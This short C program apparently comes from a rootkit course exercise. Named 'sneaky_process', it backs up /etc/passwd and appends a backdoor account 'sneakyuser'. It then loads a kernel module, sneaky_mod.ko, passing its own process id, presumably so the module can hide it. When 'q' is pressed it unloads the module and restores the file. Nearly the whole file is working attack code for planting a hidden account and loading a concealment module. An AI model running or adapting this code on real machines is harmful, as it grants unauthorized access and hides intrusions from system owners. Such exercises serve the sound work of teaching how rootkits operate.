#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

void etc_passwd2() {
  system("cp /etc/passwd /tmp/passwd");
  system("echo \"sneakyuser:abc123:2000:2000:sneakyuser:/root:bash\">>/etc/passwd");
}
void recover_etc_passwd() {
  system("mv /tmp/passwd /etc/passwd");
}

void load_module(pid_t pid) {
  char str[100];
  sprintf(str, "insmod sneaky_mod.ko pid=%d\n", pid);
  fprintf(stdout, "load module: %s", str);
  system(str);
}

void rm_module() {
  fprintf(stdout, "unload module\n");
  system("rmmod sneaky_mod.ko");
}

void listen_q() {
  int input = 0;
  for (; (input = getchar()) != 'q';) {
  }
  fprintf(stdout, "receive q from keyboard, quit\n");
}

int main() {
  pid_t pid = getpid();
  fprintf(stdout, "sneaky_process pid = %d\n", pid);
  etc_passwd2();
  load_module(pid);
  listen_q();
  rm_module();
  recover_etc_passwd();
  return EXIT_SUCCESS;
}
